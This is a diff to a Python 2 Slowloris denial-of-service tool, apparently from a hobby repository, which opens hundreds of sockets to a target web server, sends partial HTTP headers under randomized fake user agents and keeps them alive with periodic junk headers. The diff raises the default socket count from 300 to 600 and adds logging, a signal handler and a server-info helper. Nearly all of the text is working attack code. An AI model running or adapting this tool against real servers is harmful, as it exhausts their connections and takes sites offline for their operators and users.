@@ -1,13 +1,16 @@
-#!/usr/bin/env python
+#! venv/bin/python
 # -*- coding: utf-8 -*-
 
 import re
 import sys
 import time
 import socket
+import signal
 import os.path
 import logging
 import argparse
+import requests
+
 
 from Queue import Queue
 from threading import Thread
@@ -24,7 +27,7 @@ class SlowLoris(Thread):
 
     numberOfBuilders = 3
 
-    def __init__(self, url, soc_cnt=300, port=80, headers={
+    def __init__(self, url, soc_cnt=600, port=80, headers={
         'User-Agent': None,  # UserAgent()
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Encoding': 'gzip, deflate',
@@ -45,7 +48,11 @@ class SlowLoris(Thread):
             raise ValueError("Sockets count is to large {}".format(soc_cnt))
         self.soc_cnt = soc_cnt
         self.headers = headers
-        self.fake_ua = UserAgent()
+        try:
+            self.fake_ua = UserAgent()
+        except FakeUserAgentError as fe:
+            logging.exception(fe.message)
+            sys.exit(-1)
         self.__sockets = []
         self.__sended_request_cnt = 0
         self.__died_sockets_cnt = 0
@@ -56,9 +63,8 @@ class SlowLoris(Thread):
         for con in self.__sockets:
             try:
                 con.close()
-            except:
-                # TODO: add logging here
-                pass
+            except Exception as e:
+                logging.exception(e.message)
         del self.__sockets
 
     def __create_socket(self):
@@ -74,7 +80,7 @@ class SlowLoris(Thread):
                             self.headers[k] = str(self.fake_ua.random)
                         res.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                 except Exception as e:
-                    # TODO: add logging here
+                    logging.exception(e.message)
                     pass
                 else:
                     self.__sockets.append(res)
@@ -86,11 +92,12 @@ class SlowLoris(Thread):
             try:
                 soc.send("X-a: {} \r\n".format(randint(0, 9999999)))
                 self.__sended_request_cnt += 1
-            except:
+            except socket.error:
                 self.__sockets.remove(soc)
                 self.__died_sockets_cnt += 1
                 self.__alive_socket_cnt -= 1
-                # TODO: add logging here
+            except Exception as e:
+                logging.exception(e.message)
             finally:
                 q.task_done()
 
@@ -139,7 +146,7 @@ def validate_url(url):
 
 
 def initialize_logger(mode=0, output_dir="./logs/", format="%(asctime)s - %(levelname)s - %(message)s"):
-    #TODO нахера эти уровни, захерачить все в один.
+    # TODO нахера эти уровни, захерачить все в один.
     logger = logging.getLogger()
     logger.setLevel(logging.DEBUG)
 
@@ -187,7 +194,7 @@ def parse_args():
 
     if args.url:
         if validate_url(args.url):
-            res["url"] = args.url
+            res["url"] = args.url.replace('http://', '').replace('https://', '')
         else:
             parser.print_help()
             sys.exit(-1)
@@ -216,6 +223,12 @@ def parse_args():
     return res
 
 
+def signal_handler(num, stack):
+    # TODO add action on exit
+    sys.stdout.write("\r")
+    sys.exit(0)
+
+
 def main(**kwargs):
     # TODO Write a beauty menu
     # TODO Write loggging
@@ -223,15 +236,29 @@ def main(**kwargs):
     sl = SlowLoris(url=kwargs["url"], soc_cnt=kwargs["ss"], port=kwargs["port"])
     sl.start()
     while True:
-        try:
-            sys.stdout.write("\r{}".format(sl.get_counters()))
-            sys.stdout.flush()
-            time.sleep(1)
-        except:
-            sl.kill()
-            sys.exit(-1)
+        # try:
+        sys.stdout.write("\r{}".format(sl.get_counters()))
+        sys.stdout.flush()
+        time.sleep(1)
+        # except:
+        #     sl.kill()
+        #     sys.exit(-1)
+
+
+def get_info_url(url):
+    res = {}
+    try:
+        response = requests.get(url)
+        res["ip"] = response.headers["origin"]
+        res["serv"] = response.headers["Server"]
+    except:
+        pass
+    return res
+
 
 
 if __name__ == "__main__":
     args = parse_args()
+    # signal handler
+    signal.signal(signal.SIGINT, signal_handler)
     main(**args)
